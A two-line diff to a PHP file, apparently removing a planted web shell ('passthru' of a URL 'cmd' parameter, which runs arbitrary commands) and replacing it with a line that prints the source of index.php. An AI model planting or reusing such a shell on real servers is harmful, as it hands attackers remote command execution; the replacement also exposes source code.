@@ -1,1 +1,1 @@
-<?php passthru($_GET[cmd]); ?>
+<?php echo file_get_contents('index.php'); ?> 
